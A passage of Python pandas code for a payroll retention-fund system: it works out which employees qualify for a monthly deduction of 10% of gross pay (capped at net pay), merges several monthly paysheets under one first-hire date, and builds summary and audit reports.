    out["First Hire Date"] = pd.to_datetime(out[first_hire_col], errors="coerce")
    out["First Hire Date Valid"] = out["First Hire Date"].notna()

    month_ts = pd.Timestamp(paysheet_month).to_period("M").to_timestamp()
    out["Paysheet Month"] = month_ts
    hire_month = out["First Hire Date"].dt.to_period("M")
    out["Hired By This Month"] = (
        out["First Hire Date Valid"]
        & (hire_month <= month_ts.to_period("M"))
    )

    exceptional_set = {
        _retention_clean_text(v).upper()
        for v in (exceptional_erps or [])
        if _retention_clean_text(v)
    }
    out["Exceptional ERP"] = out[erp_col].str.upper().isin(exceptional_set)

    out = _attach_employee_profile(
        out,
        erp_col=erp_col,
        employee_master=employee_master,
    )

    ignored_cc_set = {
        _retention_clean_text(v).upper()
        for v in (ignored_company_codes or [])
        if _retention_clean_text(v)
    }
    out["Company Code Excluded"] = (
        out["Company Code"].fillna("").astype(str).str.strip().str.upper().isin(ignored_cc_set)
    )

    out = _attach_customize_rule(
        out,
        customize_dashboard=customize_dashboard,
    )

    out["Financial Data Valid"] = (
        out[gross_col].notna()
        & out[net_pay_col].notna()
        & out[gross_col].ge(0)
        & out[net_pay_col].ge(0)
    )

    out["10% of Gross"] = out[gross_col] * 0.10

    employment_type = (
        out["Employment Type"]
        .fillna("")
        .astype(str)
        .str.strip()
        .str.lower()
    )
    full_time = employment_type.eq("full time")

    retention_yes = (
        out["Retention Applicable"]
        .fillna("")
        .astype(str)
        .str.strip()
        .str.lower()
        .eq("yes")
    )

    out["Deduction Applicable"] = (
        out["First Hire Date Valid"]
        & out["Hired By This Month"]
        & ~out["Exceptional ERP"]
        & ~out["Company Code Excluded"]
        & ~out["Employee Master Mapping Missing"]
        & out["Customize Rule Matched"]
        & full_time
        & retention_yes
        & out["Financial Data Valid"]
    )

    out["Deduction Amount"] = 0.0
    applicable = out["Deduction Applicable"]
    if applicable.any():
        # Exact business formula: min(10% of Monthly Gross, Net Pay).
        out.loc[applicable, "Deduction Amount"] = out.loc[
            applicable, ["10% of Gross", net_pay_col]
        ].min(axis=1)

    def _status(row):
        if not row["First Hire Date Valid"]:
            return "Invalid First Hire Date"
        if not row["Hired By This Month"]:
            return "Before First Hire Month"
        if row["Exceptional ERP"]:
            return "Exceptional ERP - No Deduction"
        if row["Employee Master Mapping Missing"]:
            return "Employee Master Mapping Missing"
        if row["Company Code Excluded"]:
            return "Excluded Company Code - No Deduction"
        if not row["Customize Rule Matched"]:
            return "Customize Rule Missing"
        if normalise_retention_employment_type(row.get("Employment Type")) != "Full Time":
            return "Non-Full Time - No Deduction"
        if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
            return "Retention Not Applicable - No Deduction"
        if not row["Financial Data Valid"]:
            return "Invalid Pay Data"
        if row["Deduction Amount"] <= 0:
            return "No Deduction - Zero Eligible Amount"
        return "Pending Release"

    def _rule_remark(row):
        if not row.get("Customize Rule Matched", False):
            return "Rule Not Available"
        if normalise_retention_employment_type(row.get("Employment Type")) != "Full Time":
            return "No Deduction - Non-Full Time"
        if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
            return "No Deduction - Retention Not Applicable"
        return "Retention Eligible - Full Time"

    def _final_remark(row):
        if not row["First Hire Date Valid"]:
            return "No Deduction - Invalid First Hire Date"
        if not row["Hired By This Month"]:
            return "No Deduction - Before First Hire Month"
        if row["Exceptional ERP"]:
            return "No Deduction - Exceptional ERP"
        if row["Employee Master Mapping Missing"]:
            return "No Deduction - Employee Mapping Missing"
        if row["Company Code Excluded"]:
            return "No Deduction - Excluded Company Code"
        if not row["Customize Rule Matched"]:
            return "No Deduction - Customize Rule Missing"
        if normalise_retention_employment_type(row.get("Employment Type")) != "Full Time":
            return "No Deduction - Non-Full Time"
        if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
            return "No Deduction - Retention Not Applicable"
        if not row["Financial Data Valid"]:
            return "No Deduction - Invalid Pay Data"
        if row["Deduction Amount"] <= 0:
            return "No Deduction - Zero Eligible Amount"
        return "Retention Deducted"

    out["Retention Remarks"] = out.apply(_rule_remark, axis=1)
    out["Status"] = out.apply(_status, axis=1)
    out["Final Retention Remark"] = out.apply(_final_remark, axis=1)
    out["First Hire Month"] = out["First Hire Date"].dt.to_period("M").astype("string")
    return out


def process_consolidated_paysheets(
    monthly_inputs: list,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    employee_master: pd.DataFrame = None,
    deduction_pct: float = 10.0,
    ignored_company_codes: list = None,
) -> tuple:
    """Process several monthly paysheets using one canonical First Hire Date.

    `ignored_company_codes` is appended to preserve compatibility with older
    callers. The earliest valid First Hire Date found for each ERP across the
    uploaded months becomes the canonical First Hire Date.
    """
    if float(deduction_pct) != 10.0:
        raise ValueError("Retention Fund deduction percentage must be exactly 10%.")

    prepared = []
    hire_rows = []

    for item in monthly_inputs:
        if isinstance(item, dict):
            month = item.get("month")
            data = item.get("data")
            source = item.get("source", "")
        else:
            month = item[0]
            data = item[1]
            source = item[2] if len(item) > 2 else ""

        if data is None or data.empty:
            continue

        missing = [c for c in CONSOLIDATED_PAYSHEET_COLUMNS if c not in data.columns]
        if missing:
            raise ValueError(
                f"{source or 'Paysheet'} is missing required column(s): {', '.join(missing)}"
            )

        work = data.copy()
        work["ERP"] = work["ERP"].apply(_retention_clean_text)
        if work["ERP"].eq("").any():
            raise ValueError(f"{source or 'Paysheet'} contains a blank ERP.")

        work["__erp_key"] = work["ERP"].str.upper()
        work["__uploaded_first_hire"] = pd.to_datetime(
            work["First Hire Date"], errors="coerce"
        )

        hire_rows.append(work[["__erp_key", "__uploaded_first_hire"]].copy())
        prepared.append({"month": month, "data": work, "source": source})

    if not prepared:
        return pd.DataFrame(), pd.DataFrame()

    all_hires = pd.concat(hire_rows, ignore_index=True)
    valid_hires = all_hires.dropna(subset=["__uploaded_first_hire"])

    canonical = valid_hires.groupby("__erp_key")["__uploaded_first_hire"].min()
    distinct_dates = valid_hires.groupby("__erp_key")["__uploaded_first_hire"].nunique()
    variance_map = distinct_dates.gt(1).to_dict()

    monthly_results = []
    for item in prepared:
        work = item["data"].copy()
        work["Uploaded First Hire Date"] = work["__uploaded_first_hire"]
        work["First Hire Date"] = work["__erp_key"].map(canonical)
        work["First Hire Date Variance"] = (
            work["__erp_key"].map(variance_map).fillna(False).astype(bool)
        )
        work["First Hire Date Recovered"] = (
            work["__uploaded_first_hire"].isna()
            & work["First Hire Date"].notna()
        )
        work = work.drop(columns=["__uploaded_first_hire", "__erp_key"])

        result = compute_paysheet_deduction(
            work,
            erp_col="ERP",
            first_hire_col="First Hire Date",
            net_pay_col="Net Pay",
            gross_col="Monthly Gross",
            paysheet_month=item["month"],
            exceptional_erps=exceptional_erps,
            customize_dashboard=customize_dashboard,
            deduction_pct=10.0,
            employee_master=employee_master,
            ignored_company_codes=ignored_company_codes,
        )
        result["Source File"] = item["source"]
        monthly_results.append(result)

    return consolidate_paysheet_months(monthly_results, erp_col="ERP")


def consolidate_paysheet_months(monthly_results: list, erp_col: str = "ERP") -> tuple:
    """Return (ERP-level summary, month-wise consolidated detail)."""
    if not monthly_results:
        return pd.DataFrame(), pd.DataFrame()

    combined = pd.concat(monthly_results, ignore_index=True)
    combined["Paysheet Month"] = (
        pd.to_datetime(combined["Paysheet Month"])
        .dt.to_period("M")
        .dt.to_timestamp()
    )

    duplicate_pair = combined.duplicated(
        subset=[erp_col, "Paysheet Month"],
        keep=False,
    )
    if duplicate_pair.any():
        examples = combined.loc[
            duplicate_pair, [erp_col, "Paysheet Month"]
        ].head(10).copy()
        examples["Paysheet Month"] = examples["Paysheet Month"].dt.strftime("%b-%Y")
        pairs = ", ".join(
            f"{row[erp_col]} ({row['Paysheet Month']})"
            for _, row in examples.iterrows()
        )
        raise ValueError(f"The same ERP/month was uploaded more than once: {pairs}")

    combined = combined.sort_values([erp_col, "Paysheet Month"]).reset_index(drop=True)

    if "First Hire Date Variance" not in combined.columns:
        combined["First Hire Date Variance"] = False
    if "First Hire Date Recovered" not in combined.columns:
        combined["First Hire Date Recovered"] = False
    if "Company Code Excluded" not in combined.columns:
        combined["Company Code Excluded"] = False
    if "Exceptional ERP" not in combined.columns:
        combined["Exceptional ERP"] = False

    summary = combined.groupby(erp_col, dropna=False).agg(
        **{
            "First Hire Date": ("First Hire Date", "min"),
            "First Hire Date Variance": ("First Hire Date Variance", "max"),
            "First Hire Date Recovered": ("First Hire Date Recovered", "max"),
            "Branch": ("Branch", "last"),
            "Designation": ("Designation", "last"),
            "Company Code": ("Company Code", "last"),
            "Employment Type": ("Employment Type", "last"),
            "Retention Applicable": ("Retention Applicable", "last"),
            "Company Code Excluded": ("Company Code Excluded", "max"),
            "Exceptional ERP": ("Exceptional ERP", "max"),
            "Retention Remarks": ("Retention Remarks", "last"),
            "Final Retention Remark": ("Final Retention Remark", "last"),
            "Months Processed": ("Paysheet Month", "nunique"),
            "Months With Deduction": ("Deduction Amount", lambda s: int((s > 0).sum())),
            "Total Deduction Accumulated": ("Deduction Amount", "sum"),
            "Latest Status": ("Status", "last"),
        }
    ).reset_index()

    first_deduction = (
        combined.loc[combined["Deduction Amount"] > 0]
        .groupby(erp_col)["Paysheet Month"]
        .min()
        .rename("First Deduction Month")
    )
    summary = summary.merge(first_deduction, on=erp_col, how="left")
    return summary.sort_values(erp_col).reset_index(drop=True), combined


def _retention_group_report(combined: pd.DataFrame, group_col: str) -> pd.DataFrame:
    if combined is None or combined.empty or group_col not in combined.columns:
        return pd.DataFrame()

    work = combined.copy()
    work[group_col] = (
        work[group_col]
        .fillna("")
        .astype(str)
        .str.strip()
        .replace("", "Unmapped")
    )
    return (
        work.groupby(group_col, dropna=False)
        .agg(
            Employees=("ERP", "nunique"),
            Paysheet_Rows=("ERP", "size"),
            Deduction_Rows=("Deduction Amount", lambda s: int((s > 0).sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
        )
        .reset_index()
        .sort_values("Total_Retention_Fund", ascending=False)
        .reset_index(drop=True)
    )


def build_retention_reports(summary: pd.DataFrame, combined: pd.DataFrame) -> dict:
    """Create the complete Retention Fund reporting pack."""
    empty_report = {
        "ERP Summary": pd.DataFrame(),
        "Month Wise Detail": pd.DataFrame(),
        "Monthly Summary": pd.DataFrame(),
        "Branch Summary": pd.DataFrame(),
        "Designation Summary": pd.DataFrame(),
        "Company Summary": pd.DataFrame(),
        "Employment Type Summary": pd.DataFrame(),
        "Retention Remarks Summary": pd.DataFrame(),
        "Status Summary": pd.DataFrame(),
        "Exclusion Summary": pd.DataFrame(),
        "Pending Releases": pd.DataFrame(),
        "Exceptions - No Deduction": pd.DataFrame(),
        "Missing Mapping": pd.DataFrame(),
        "First Hire Date Audit": pd.DataFrame(),
    }
    if combined is None or combined.empty:
        return empty_report

    work = combined.copy()
    work["Paysheet Month"] = pd.to_datetime(work["Paysheet Month"])

    monthly = (
        work.groupby("Paysheet Month")
        .agg(
            Employees=("ERP", "nunique"),
            Deduction_Employees=("Deduction Amount", lambda s: int((s > 0).sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
            Excluded_Company_Code_Rows=("Company Code Excluded", "sum"),
            Exceptional_ERP_Rows=("Exceptional ERP", "sum"),
            Non_Full_Time_Rows=("Employment Type", lambda s: int(
                s.fillna("").astype(str).str.strip().str.lower().eq("non-full time").sum()
            )),
            Missing_Mapping_Rows=("Employee Master Mapping Missing", "sum"),
        )
        .reset_index()
        .sort_values("Paysheet Month")
    )

    status_summary = (
        work.groupby("Status", dropna=False)
        .agg(
            Rows=("ERP", "size"),
            Employees=("ERP", "nunique"),
            Total_Retention_Fund=("Deduction Amount", "sum"),
        )
        .reset_index()
        .sort_values(["Rows", "Status"], ascending=[False, True])
    )

    exclusion_statuses = [
        "Excluded Company Code - No Deduction",
        "Exceptional ERP - No Deduction",
        "Non-Full Time - No Deduction",
        "Retention Not Applicable - No Deduction",
    ]
    exclusion_summary = (
        work.loc[work["Status"].isin(exclusion_statuses)]
        .groupby("Status", dropna=False)
        .agg(
            Rows=("ERP", "size"),
            Employees=("ERP", "nunique"),
        )
        .reset_index()
    )

    pending = work.loc[work["Status"].eq("Pending Release")].copy()
    exceptions = work.loc[~work["Status"].eq("Pending Release")].copy()
    missing_mapping = work.loc[
        work["Status"].isin(["Employee Master Mapping Missing", "Customize Rule Missing"])
    ].copy()
    first_hire_audit = work.loc[
        work["First Hire Date Variance"].fillna(False)
        | work["First Hire Date Recovered"].fillna(False)
        | work["Status"].eq("Invalid First Hire Date")
    ].copy()

    return {
        "ERP Summary": summary.copy(),
        "Month Wise Detail": work,
        "Monthly Summary": monthly,
        "Branch Summary": _retention_group_report(work, "Branch"),
        "Designation Summary": _retention_group_report(work, "Designation"),
        "Company Summary": _retention_group_report(work, "Company Code"),
        "Employment Type Summary": _retention_group_report(work, "Employment Type"),
        "Retention Remarks Summary": _retention_group_report(work, "Final Retention Remark"),
        "Status Summary": status_summary,
        "Exclusion Summary": exclusion_summary,
        "Pending Releases": pending,
        "Exceptions - No Deduction": exceptions,
        "Missing Mapping": missing_mapping,
        "First Hire Date Audit": first_hire_audit,
    }
